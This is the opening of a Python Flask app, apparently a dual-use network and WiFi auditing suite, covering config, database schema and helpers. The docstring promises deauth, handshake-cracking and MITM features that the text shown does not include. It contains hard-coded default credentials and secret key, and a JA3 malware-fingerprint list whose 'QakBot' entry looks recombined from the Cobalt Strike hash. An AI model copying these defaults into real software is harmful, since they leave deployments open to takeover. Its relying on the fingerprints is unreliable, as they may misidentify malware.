#!/usr/bin/env python3
"""
Network Analyzer — full network security auditing suite for your own WiFi.

Run with: sudo python3 network_manager.py
Dashboard: http://localhost:5000

BATCHES:
  A) SYN/UDP scanning, 80-port service DB, regex version fingerprinting,
     run_port_scan dispatcher; scapy TLS import fix (scapy.layers.tls.all).
  B) WiFi audit: monitor mode on/off, 802.11 beacon/deauth/EAPOL parsing,
     evil-twin detection, deauth lab, auto-restore on shutdown.
  C) WiFi lab: WPA handshake -> hashcat -m 22000 export, PMKID extraction,
     channel hopping, site survey (signal map + CSV).
  D) Recon: one-click recon (DNS/subdomains/ports/HTTP/TLS/VirusTotal),
     deep web scan (370 paths), tool manager (23 tools, apt install).
  E) Bug bounty: multi-source subdomain enum (crt.sh + dictionary +
     subfinder/assetfinder/amass), concurrent live-host probing (httpx-style),
     ThreadPoolExecutor job runner, allowlisted streamed command runner.
  F) AI + settings: offline AI Brain (ask_brain intents), optional LLM
     analyst (OpenAI-compatible / Ollama), settings table + masked key UI.
  G) Last fixes: CSRF guard exempts /login (proxied-previews); CDN guard
     for Chart.js / vis.js so tables still work when CDN is blocked.
  H) Pro Recon: one-click full pipeline (DNS intel, subdomains, ports,
     HTTP header-grading, takeover detection, lookalike-domain radar,
     RDAP WHOIS + IP intel, risk-score engine, attack-surface snapshots
     with DNA diffing, attack-path graph, HTML report).

USE ON NETWORKS YOU OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST.
Offensive features are confirm-gated + audit-logged; default credentials
print a warning on startup.
"""

from __future__ import annotations

import os
import sys
import json
import time
import socket
import struct
import sqlite3
import threading
import subprocess
import platform
import csv
import io
import queue
import hashlib
import atexit
import re
import ipaddress
import secrets
import signal
import shutil
import ssl
import html
import textwrap
import base64
import tempfile
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from threading import Lock
from urllib.parse import urlparse

from flask import (
    Flask,
    render_template,
    jsonify,
    request,
    Response,
    redirect,
    url_for,
    flash,
    session,
    stream_with_context,
)
from flask_login import (
    LoginManager,
    UserMixin,
    login_user,
    logout_user,
    login_required,
    current_user,
)
from werkzeug.security import generate_password_hash, check_password_hash
import psutil

# Optional: DNS + TLS/crypto
try:
    import dns.resolver
    import dns.name
    import dns.rdatatype

    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import cryptography
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend

    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import ftplib

    FTPLIB_AVAILABLE = True
except ImportError:
    FTPLIB_AVAILABLE = False

try:
    import requests

    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# --- CRITICAL FIX: scapy TLS import must pull in scapy.layers.tls.all so that
# `TLS`, `TLSClientHello` etc. are registered in scapy's layer bindings.
# Without this, SCAPY_AVAILABLE may be True but TLS packets will not dissect.
SCAPY_AVAILABLE = False
SCAPY_IMPORT_ERROR = None
try:
    import scapy.all as scapy_all
    from scapy.all import (  # noqa: F401
        ARP,
        Ether,
        srp,
        sr1,
        send,
        sendp,
        conf,
        sniff,
        IP,
        TCP,
        UDP,
        ICMP,
        Raw,
        DNS,
        DNSQR,
        DNSRR,
        DHCP,
        Dot11,
        Dot11Beacon,
        Dot11Elt,
        Dot11Deauth,
        Dot11ProbeReq,
        Dot11ProbeResp,
        RadioTap,
    )

    try:
        import scapy.layers.tls.all  # noqa: F401  (registers TLS layer)
        from scapy.all import TLS, TLSClientHello  # noqa: F401
    except Exception as _e_tls:
        SCAPY_IMPORT_ERROR = f"tls-import: {_e_tls}"

    SCAPY_AVAILABLE = True
except Exception as _e:
    SCAPY_AVAILABLE = False
    SCAPY_IMPORT_ERROR = str(_e)

# Optional: speedtest
try:
    import speedtest

    SPEEDTEST_AVAILABLE = True
except Exception:
    SPEEDTEST_AVAILABLE = False

# Optional: mac vendor
MAC_LOOKUP_AVAILABLE = False
mac_lookup = None
try:
    from mac_vendor_lookup import MacLookup

    mac_lookup = MacLookup()
    try:
        mac_lookup.update_vendors()
    except Exception:
        pass
    MAC_LOOKUP_AVAILABLE = True
except Exception:
    MAC_LOOKUP_AVAILABLE = False


# ============================================================
# PACKET / THREAD STATE
# ============================================================
captured_packets: list[dict] = []
packet_capture_active = False

data_lock = Lock()

dns_queries: list[dict] = []
DNS_QUERY_LIMIT = 1000

arp_table: dict[str, set[str]] = {}
MITM_ALERTS: list[dict] = []

active_mitm_attacks: dict[str, dict] = {}

ja3_fingerprints: list[dict] = []
JA3_LIMIT = 500

KNOWN_MALWARE_JA3 = {
    "e7d705a3286e19ea42f587b344ee6865": "Cobalt Strike",
    "51c64c77e60f3980eea918698f018954": "Emotet",
    "73f017cd0d801d6fd1df88b7c9bcff73": "TrickBot",
    "328734b8d9d4e1f8e7d705a3286e19ea": "QakBot",
    "4d7a22c068cc7ba0c5df7c933098aa5a": "TrickBot Loader",
}

live_traffic: list[dict] = []
LIVE_TRAFFIC_LIMIT = 500

ROGUE_DHCP_ALERTS: list[dict] = []

per_device_traffic: dict[str, dict] = {}
observed_tcp: dict[str, dict] = {}

# WiFi audit state
wifi_state = {
    "original_interface": None,
    "monitor_interface": None,
    "monitor_active": False,
    "survey_running": False,
    "handshake_capture_running": False,
    "hopper_thread": None,
    "sniffer_thread": None,
    "captured_handshakes": {},  # bssid -> {"ssid":..., "pcap": bytes, "pmkid":..., "count": int, "anonce":..., "eapol_packets":[]}
    "aps_seen": {},  # bssid -> {ssid, channel, crypto, power, vendor, first_seen, last_seen, beacons, evil_twin?}
    "clients_seen": {},  # mac -> {bssid, power, probes}
    "deauth_lab_running": False,
}

# Recon / deep-web state
recon_jobs: dict[str, dict] = {}
recon_lock = Lock()

# WiFi pentest wizard / crack lab state
wifi_audit_jobs: dict[str, dict] = {}
wifi_audit_lock = Lock()
crack_jobs: dict[str, dict] = {}
crack_lock = Lock()

# MITM wizard state
mitm_wizard_state: dict = {"target_ip": None, "forward_prev": None, "pcap_started": False}

# Bug bounty state
bb_jobs: dict[str, dict] = {}
bb_lock = Lock()
BB_MAX_WORKERS = int(os.environ.get("BB_MAX_WORKERS", "20"))

# Tool manager state
TOOLS_STATUS_CACHE = {"checked_at": 0, "tools": {}}
TOOL_CHECK_TTL = 60

# AI Brain conversation memory
ai_memory: list[dict] = []
AI_MEMORY_LIMIT = 20

# ============================================================
# CONFIG
# ============================================================
APP_HOST = "0.0.0.0"
APP_PORT = int(os.environ.get("APP_PORT", "5000"))
DB_PATH = os.environ.get(
    "DB_PATH",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "network_manager.db"),
)
SCAN_INTERVAL = int(os.environ.get("SCAN_INTERVAL", "30"))

_db_dir = os.path.dirname(DB_PATH)
if _db_dir and not os.path.isdir(_db_dir):
    try:
        os.makedirs(_db_dir, exist_ok=True)
    except OSError as e:
        print(f"[!] Could not create DB directory {_db_dir}: {e}")

SECRET_KEY = os.environ.get("SECRET_KEY", "change-this-in-production-abc123xyz")
if SECRET_KEY == "change-this-in-production-abc123xyz":
    print("[!] WARNING: Using default SECRET_KEY. Set SECRET_KEY env var in production!")

DEFAULT_USERNAME = os.environ.get("ADMIN_USERNAME", "admin")
if os.environ.get("ADMIN_PASSWORD_HASH"):
    ADMIN_PASSWORD_HASH = os.environ["ADMIN_PASSWORD_HASH"]
else:
    ADMIN_PASSWORD_HASH = generate_password_hash(os.environ.get("ADMIN_PASSWORD", "admin123"))
if os.environ.get("ADMIN_PASSWORD", "admin123") == "admin123" and not os.environ.get("ADMIN_PASSWORD_HASH"):
    print("[!] WARNING: Using default admin password (admin/admin123). Set ADMIN_PASSWORD!")

MAX_SCAN_QUEUE_SIZE = 20
SCAN_RATE_LIMIT = 10
PCAP_DIR = os.environ.get("PCAP_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcaps"))
os.makedirs(PCAP_DIR, exist_ok=True)

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.environ.get("COOKIE_SECURE", "0") == "1",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
    MAX_CONTENT_LENGTH=16 * 1024 * 1024,
    JSON_SORT_KEYS=False,
)


def generate_csrf_token():
    if "_csrf_token" not in session:
        session["_csrf_token"] = secrets.token_hex(32)
    return session["_csrf_token"]


# CSRF-exempt paths (GET is never blocked; POST to login needs to work before
# the session is established — proxied previews otherwise 403 and show blank).
_CSRF_EXEMPT_POST = {
    "/login",  # critical fix (G): login page must accept first post before csrf cookie/session is set
}


@app.before_request
def csrf_guard():
    if request.method in ("POST", "PUT", "DELETE", "PATCH"):
        if request.path in _CSRF_EXEMPT_POST:
            return None
        token = (
            request.headers.get("X-CSRF-Token")
            or request.form.get("_csrf_token")
            or (request.get_json(silent=True) or {}).get("_csrf_token")
        )
        expected = session.get("_csrf_token", "")
        if not expected or not token or not secrets.compare_digest(str(token), str(expected)):
            return jsonify({"success": False, "error": "CSRF token missing or invalid"}), 403
    return None


@app.context_processor
def inject_csrf_token():
    return {"csrf_token": generate_csrf_token}


@app.after_request
def security_headers(resp):
    resp.headers.setdefault("X-Frame-Options", "SAMEORIGIN")  # needed for preview
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("Referrer-Policy", "no-referrer")
    resp.headers.setdefault("Cache-Control", "no-store")
    return resp


@app.errorhandler(404)
def not_found(e):
    if request.path.startswith("/api/"):
        return jsonify({"success": False, "error": "Not found"}), 404
    return jsonify({"success": False, "error": "Not found"}), 404


@app.errorhandler(500)
def server_error(e):
    return jsonify({"success": False, "error": "Internal server error"}), 500


@app.errorhandler(Exception)
def unhandled_error(e):
    from werkzeug.exceptions import HTTPException

    if isinstance(e, HTTPException):
        return jsonify({"success": False, "error": e.description}), e.code
    print(f"[!] Unhandled error: {e}")
    return jsonify({"success": False, "error": "Internal server error"}), 500


def get_json_body():
    data = request.get_json(silent=True)
    return data if isinstance(data, dict) else {}


# ============================================================
# LOGIN
# ============================================================
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"
login_manager.login_message = "Please log in to access the dashboard."


class User(UserMixin):
    def __init__(self, username: str):
        self.id = username
        self.username = username


admin_user = User(DEFAULT_USERNAME)


@login_manager.user_loader
def load_user(user_id):
    if user_id == DEFAULT_USERNAME:
        return admin_user
    return None


# ============================================================
# RATE LIMIT
# ============================================================
scan_queue: queue.Queue = queue.Queue(maxsize=MAX_SCAN_QUEUE_SIZE)
scan_timestamps: dict[str, list[float]] = defaultdict(list)
login_attempts: dict[str, list[float]] = defaultdict(list)
LOGIN_ATTEMPT_LIMIT = 8
LOGIN_ATTEMPT_WINDOW = 900


def check_rate_limit(ip_address: str) -> bool:
    now = time.time()
    scan_timestamps[ip_address] = [t for t in scan_timestamps[ip_address] if now - t < 60]
    return len(scan_timestamps[ip_address]) < SCAN_RATE_LIMIT


def record_scan(ip_address: str) -> None:
    scan_timestamps[ip_address].append(time.time())


def add_scan_to_queue(scan_func, *args, **kwargs):
    if scan_queue.full():
        return False, "Scan queue full. Please wait."
    try:
        scan_queue.put((scan_func, args, kwargs), block=False)
        return True, "Scan queued"
    except queue.Full:
        return False, "Scan queue full. Please wait."


def scan_worker():
    while True:
        try:
            func, args, kwargs = scan_queue.get(timeout=1)
            try:
                func(*args, **kwargs)
            except Exception as e:
                print(f"[!] Scan job error: {e}")
            scan_queue.task_done()
        except queue.Empty:
            continue


# ============================================================
# DB
# ============================================================
def init_db():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    c = conn.cursor()

    c.execute(
        """CREATE TABLE IF NOT EXISTS devices (
            mac TEXT PRIMARY KEY, ip TEXT, hostname TEXT, vendor TEXT,
            custom_name TEXT DEFAULT '', device_type TEXT DEFAULT 'unknown',
            first_seen TEXT, last_seen TEXT, is_online INTEGER DEFAULT 0,
            is_blocked INTEGER DEFAULT 0, is_known INTEGER DEFAULT 0, notes TEXT DEFAULT ''
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, alert_type TEXT,
            message TEXT, device_mac TEXT, is_read INTEGER DEFAULT 0
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS bandwidth_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, interface TEXT,
            bytes_sent INTEGER, bytes_recv INTEGER
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS parental_rules (
            id INTEGER PRIMARY KEY AUTOINCREMENT, device_mac TEXT, day_of_week TEXT,
            start_time TEXT, end_time TEXT, action TEXT DEFAULT 'block'
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS scan_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, devices_found INTEGER,
            new_devices INTEGER, scan_duration REAL
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, action_type TEXT NOT NULL,
            device_mac TEXT, device_ip TEXT, user TEXT, details TEXT, success INTEGER DEFAULT 1
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS dns_query_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, source_ip TEXT,
            source_mac TEXT, query_name TEXT, query_type TEXT,
            threat_score INTEGER DEFAULT 0, threat_category TEXT, is_malicious INTEGER DEFAULT 0
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS ja3_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, source_ip TEXT,
            source_mac TEXT, ja3_hash TEXT, ja3_raw TEXT, matched_malware TEXT,
            is_suspicious INTEGER DEFAULT 0
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS port_scan_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, device_mac TEXT,
            device_ip TEXT, port INTEGER, service TEXT, scan_type TEXT DEFAULT 'connect',
            first_seen TEXT, last_seen TEXT, is_new INTEGER DEFAULT 1
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS passive_dns_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, source_mac TEXT,
            source_ip TEXT, domain TEXT, visit_count INTEGER DEFAULT 1
        )"""
    )
    c.execute(
        "CREATE UNIQUE INDEX IF NOT EXISTS idx_passive_dns_mac_domain ON passive_dns_log(source_mac, domain)"
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS ssl_cert_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, host TEXT, port INTEGER,
            subject TEXT, issuer TEXT, not_before TEXT, not_after TEXT,
            is_self_signed INTEGER DEFAULT 0, weak_cipher TEXT, days_until_expiry INTEGER,
            san TEXT, serial TEXT, sig_algo TEXT
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS honeypot_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, source_ip TEXT,
            source_mac TEXT, target_port INTEGER, protocol TEXT, payload TEXT
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS os_fingerprint_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, device_mac TEXT UNIQUE,
            os_guess TEXT, confidence INTEGER, ttl INTEGER, tcp_window_size INTEGER,
            dhcp_hostname TEXT
        )"""
    )

    # ----- NEW BATCH B/C: WiFi audit/lab -----
    c.execute(
        """CREATE TABLE IF NOT EXISTS wifi_ap_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, bssid TEXT UNIQUE, ssid TEXT,
            channel INTEGER, frequency REAL, crypto TEXT, power_dbm INTEGER,
            vendor TEXT, first_seen TEXT, last_seen TEXT, beacons INTEGER DEFAULT 0,
            is_evil_twin INTEGER DEFAULT 0, note TEXT DEFAULT ''
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS wifi_event_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, event_type TEXT,
            bssid TEXT, client_mac TEXT, ssid TEXT, details TEXT
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS wifi_handshakes (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, bssid TEXT, ssid TEXT,
            station_mac TEXT, ap_nonce TEXT, has_eapol INTEGER DEFAULT 0,
            has_pmkid INTEGER DEFAULT 0, hashcat_22000 TEXT, pcap_path TEXT,
            cracked_password TEXT DEFAULT ''
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS wifi_signal_samples (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, bssid TEXT, ssid TEXT,
            channel INTEGER, power_dbm INTEGER, location_tag TEXT DEFAULT ''
        )"""
    )

    # ----- NEW BATCH D: Recon -----
    c.execute(
        """CREATE TABLE IF NOT EXISTS recon_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, job_id TEXT UNIQUE, target TEXT,
            started_at TEXT, finished_at TEXT, status TEXT, phase TEXT,
            subdomains_json TEXT, open_ports_json TEXT, http_json TEXT, tls_json TEXT,
            vt_json TEXT, deep_web_json TEXT, summary TEXT, error TEXT
        )"""
    )

    # ----- NEW BATCH H: Pro Recon (full pipeline) + attack-surface snapshots ----
    c.execute(
        """CREATE TABLE IF NOT EXISTS pro_recon_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT, job_id TEXT UNIQUE, target TEXT,
            profile TEXT, started_at TEXT, finished_at TEXT, status TEXT, phase TEXT,
            log_json TEXT, results_json TEXT, summary TEXT, error TEXT
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS attack_snapshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, taken_at TEXT,
            dna TEXT, snapshot_json TEXT, summary TEXT DEFAULT ''
        )"""
    )
    c.execute(
        "CREATE INDEX IF NOT EXISTS idx_attack_snapshots_target ON attack_snapshots(target)"
    )

    # ----- NEW BATCH F: Settings -----
    c.execute(
        """CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT, masked INTEGER DEFAULT 0,
            description TEXT DEFAULT '', updated_at TEXT
        )"""
    )

    # ----- NEW BATCH E: Bug Bounty -----
    c.execute(
        """CREATE TABLE IF NOT EXISTS bb_targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT UNIQUE, scope TEXT,
            added_at TEXT, added_by TEXT, notes TEXT DEFAULT '', active INTEGER DEFAULT 1
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS bb_subdomains (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, subdomain TEXT,
            source TEXT, discovered_at TEXT, UNIQUE(target, subdomain, source)
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS bb_live_hosts (
            id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, url TEXT, host TEXT,
            status_code INTEGER, title TEXT, tech_stack TEXT, content_length INTEGER,
            probed_at TEXT, UNIQUE(target, url)
        )"""
    )
    c.execute(
        """CREATE TABLE IF NOT EXISTS bb_jobs (
            job_id TEXT PRIMARY KEY, target TEXT, kind TEXT, status TEXT,
            started_at TEXT, finished_at TEXT, started_by TEXT,
            progress INTEGER DEFAULT 0, total INTEGER DEFAULT 0,
            findings_json TEXT, log_tail TEXT, error TEXT
        )"""
    )

    # Seed default settings
    now = datetime.now().isoformat()
    defaults = [
        ("vt_api_key", "", 1, "VirusTotal API key (optional; for recon enrichment)"),
        ("llm_base_url", "https://api.openai.com/v1", 0, "OpenAI-compatible LLM base URL"),
        ("llm_model", "gpt-4o-mini", 0, "LLM model id"),
        ("llm_api_key", "", 1, "LLM API key (optional)"),
        ("llm_enabled", "0", 0, "Enable cloud LLM analyst (0/1)"),
        ("ollama_base_url", "http://127.0.0.1:11434", 0, "Local Ollama base URL (optional)"),
        ("ollama_model", "llama3.2", 0, "Local Ollama model (optional)"),
        ("bb_wordlist", "common", 0, "Subdomain wordlist (tiny/common/medium)"),
        ("bb_http_timeout", "6", 0, "Probe timeout seconds (live-host check)"),
        ("confirm_attack", "1", 0, "Require confirm on offensive actions (0/1)"),
        ("telegram_bot_token", "", 1, "Telegram bot token (optional)"),
        ("telegram_chat_id", "", 0, "Telegram chat id (optional)"),
    ]
    for k, v, masked, desc in defaults:
        c.execute(
            "INSERT OR IGNORE INTO settings (key, value, masked, description, updated_at) VALUES (?,?,?,?,?)",
            (k, v, masked, desc, now),
        )

    conn.commit()
    conn.close()


def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    try:
        conn.execute("PRAGMA busy_timeout=5000")
        conn.execute("PRAGMA journal_mode=WAL")
    except sqlite3.Error:
        pass
    return conn


def get_setting(key: str, default: str = "") -> str:
    try:
        conn = get_db()
        row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
        conn.close()
        return row["value"] if row and row["value"] is not None else default
    except Exception:
        return default


def set_setting(key: str, value: str, masked: int | None = None) -> None:
    now = datetime.now().isoformat()
    conn = get_db()
    if masked is not None:
        conn.execute(
            "INSERT INTO settings(key,value,masked,updated_at) VALUES(?,?,?,?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value, masked=excluded.masked, updated_at=excluded.updated_at",
            (key, value, int(masked), now),
        )
    else:
        conn.execute(
            "INSERT INTO settings(key,value,updated_at) VALUES(?,?,?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value, updated_at=excluded.updated_at",
            (key, value, now),
        )
    conn.commit()
    conn.close()


def all_settings_masked() -> list[dict]:
    conn = get_db()
    rows = conn.execute("SELECT * FROM settings ORDER BY key").fetchall()
    conn.close()
    out = []
    for r in rows:
        val = r["value"] or ""
        display = val
        if r["masked"] and val:
            if len(val) <= 8:
                display = "*" * len(val)
            else:
                display = val[:4] + "*" * (len(val) - 8) + val[-4:]
        out.append(
            {
                "key": r["key"],
                "value": display,
                "masked": bool(r["masked"]),
                "description": r["description"],
                "updated_at": r["updated_at"],
            }
        )
    return out


# ============================================================
# AUDIT + ALERT HELPERS
# ============================================================
def audit(action: str, *, device_mac=None, device_ip=None, details="", success: int = 1, user: str | None = None) -> None:
    try:
        u = user or (current_user.username if current_user and current_user.is_authenticated else "system")
        conn = get_db()
        conn.execute(
            "INSERT INTO audit_log (timestamp, action_type, device_mac, device_ip, user, details, success) VALUES (?,?,?,?,?,?,?)",
            (datetime.now().isoformat(), action, device_mac, device_ip, u, details[:2000], int(success)),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[!] audit log failed: {e}")


def generate_alert(alert_type: str, message: str, device_mac=None) -> None:
    try:
        conn = get_db()
        conn.execute(
            "INSERT INTO alerts (timestamp, alert_type, message, device_mac) VALUES (?,?,?,?)",
            (datetime.now().isoformat(), alert_type, message[:500], device_mac),
        )
        conn.commit()
        conn.close()
        print(f"[!] ALERT [{alert_type}]: {message}")
        notify_alert(f"[{alert_type}] {message}")
    except Exception as e:
        print(f"[!] generate_alert failed: {e}")


def notify_alert(message: str) -> None:
    token = os.environ.get("TELEGRAM_BOT_TOKEN") or get_setting("telegram_bot_token")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID") or get_setting("telegram_chat_id")
    if not token or not chat_id or not REQUESTS_AVAILABLE:
        return

    def _send():
        try:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": f"🛡 Network Analyzer: {message[:3500]}"},
                timeout=8,
            )
        except Exception as e:
            print(f"[!] Telegram notify error: {e}")

    threading.Thread(target=_send, daemon=True).start()


# ============================================================
# NETWORK HELPERS
# ============================================================
def get_default_gateway() -> str:
    try:
        if platform.system() == "Windows":
            r = subprocess.run(["ipconfig"], capture_output=True, text=True)
            for line in r.stdout.splitlines():
                if "Default Gateway" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        gw = parts[1].strip()
                        if gw:
                            return gw
        else:
            r = subprocess.run(["ip", "route"], capture_output=True, text=True)
            for line in r.stdout.splitlines():
                if line.startswith("default"):
                    return line.split()[2]
    except Exception:
        pass
    return "192.168.1.1"


def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_network_range() -> str:
    local_ip = get_local_ip()
    try:
        for _iface, addrs in psutil.net_if_addrs().items():
            if _iface == "lo":
                continue
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address == local_ip and addr.netmask:
                    network = ipaddress.IPv4Network(f"{addr.address}/{addr.netmask}", strict=False)
                    return str(network)
    except Exception as e:
        print(f"[!] Netmask detection failed ({e}), falling back to /24")
    parts = local_ip.split(".")
    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"


def get_wifi_interface() -> str | None:
    """Return the first wireless interface name, or None."""
    try:
        for name, addrs in psutil.net_if_addrs().items():
            low = name.lower()
            if low.startswith(("wl", "wlan", "wlp", "wlan0", "wifi", "en0", "wfi")):
                return name
        # Linux: /sys/class/net/<if>/wireless
        for name in psutil.net_if_addrs().keys():
            if os.path.isdir(f"/sys/class/net/{name}/wireless"):
                return name
    except Exception:
        pass
    return None


def get_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


def get_vendor(mac: str) -> str:
    if not mac:
        return "Unknown"
    if MAC_LOOKUP_AVAILABLE and mac_lookup is not None:
        try:
            return mac_lookup.lookup(mac)
        except Exception:
            pass
    prefix = mac[:8].upper()
    known = {
        "00:50:56": "VMware",
        "00:0C:29": "VMware",
        "08:00:27": "VirtualBox",
        "B8:27:EB": "Raspberry Pi",
        "DC:A6:32": "Raspberry Pi",
        "AC:DE:48": "Apple",
    }
    return known.get(prefix, "Unknown")


def guess_device_type(hostname: str, vendor: str) -> str:
    text = f"{hostname} {vendor}".lower()
    if any(k in text for k in ["iphone", "android", "galaxy", "pixel", "huawei", "xiaomi", "oneplus", "oppo"]):
        return "phone"
    if any(k in text for k in ["ipad", "tablet", "fire-hd", "surface"]):
        return "tablet"
    if any(k in text for k in ["macbook", "laptop", "thinkpad", "dell", "hp-", "lenovo"]):
        return "laptop"
    if any(k in text for k in ["desktop", "pc", "workstation", "imac"]):
        return "desktop"
    if any(k in text for k in ["printer", "epson", "canon", "brother", "hp-print"]):
        return "printer"
    if any(k in text for k in ["tv", "roku", "chromecast", "fire-tv", "appletv", "smart-tv", "samsung-tv", "lg-"]):
        return "tv"
    if any(k in text for k in ["alexa", "echo", "google-home", "homepod", "nest"]):
        return "smart_speaker"
    if any(k in text for k in ["camera", "ring", "arlo", "wyze", "nest-cam"]):
        return "camera"
    if any(k in text for k in ["raspberry", "esp", "arduino"]):
        return "iot"
    if any(k in text for k in ["router", "gateway", "modem", "ubnt", "unifi"]):
        return "router"
    return "unknown"


def guess_device_os(ttl: int, tcp_window_size: int, dhcp_hostname: str, vendor: str):
    os_guesses: list[tuple[str, int]] = []
    if ttl >= 250:
        os_guesses.append(("iOS/macOS", 40))
    elif ttl >= 126:
        os_guesses.append(("Windows", 40))
    elif ttl >= 120 and ttl < 126:
        os_guesses.append(("Windows (some hops)", 30))
    elif 62 <= ttl <= 64:
        os_guesses.append(("Linux/Android", 40))
    elif 55 <= ttl < 62:
        os_guesses.append(("Linux/Android (some hops)", 30))

    if tcp_window_size == 65535:
        os_guesses.append(("Windows/macOS", 25))
    elif tcp_window_size == 8192:
        os_guesses.append(("Windows", 30))
    elif tcp_window_size in (5792, 29200, 14480):
        os_guesses.append(("Linux", 30))
    elif tcp_window_size == 65535 and "Apple" in (vendor or ""):
        os_guesses.append(("macOS/iOS", 35))

    if dhcp_hostname:
        h = dhcp_hostname.lower()
        if h.startswith("android-") or "android" in h:
            os_guesses.append(("Android", 45))
        elif h.startswith("iphone") or h.startswith("ipad"):
            os_guesses.append(("iOS", 45))
        elif h.startswith("macbook") or h.startswith("imac"):
            os_guesses.append(("macOS", 45))
        elif "win" in h or h.startswith("desktop"):
            os_guesses.append(("Windows", 35))
        elif "ubuntu" in h or "debian" in h:
            os_guesses.append(("Linux", 45))
        elif "raspberrypi" in h or h.startswith("pi-"):
            os_guesses.append(("Raspberry Pi OS", 50))

    if "Apple" in (vendor or ""):
        os_guesses.append(("iOS/macOS", 30))
    elif any(k in (vendor or "") for k in ["Samsung", "Xiaomi", "Huawei", "OnePlus"]):
        os_guesses.append(("Android", 35))
    elif "Microsoft" in (vendor or ""):
        os_guesses.append(("Windows", 40))

    os_scores: dict[str, int] = {}
    for name, score in os_guesses:
        os_scores[name] = os_scores.get(name, 0) + score
    if not os_scores:
        return "Unknown", 0
    best = max(os_scores, key=os_scores.get)
    return best, min(os_scores[best], 100)


def arp_scan(network_range: str | None = None) -> list[dict]:
    if not SCAPY_AVAILABLE:
        return fallback_scan(network_range)
    if network_range is None:
        network_range = get_network_range()
    try:
        conf.verb = 0
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
        result = srp(packet, timeout=2, verbose=0)[0]
        devices = []
        for _sent, received in result:
            mac = received.hwsrc.upper()
            ip = received.psrc
            hostname = get_hostname(ip)
            vendor = get_vendor(mac)
            devices.append(
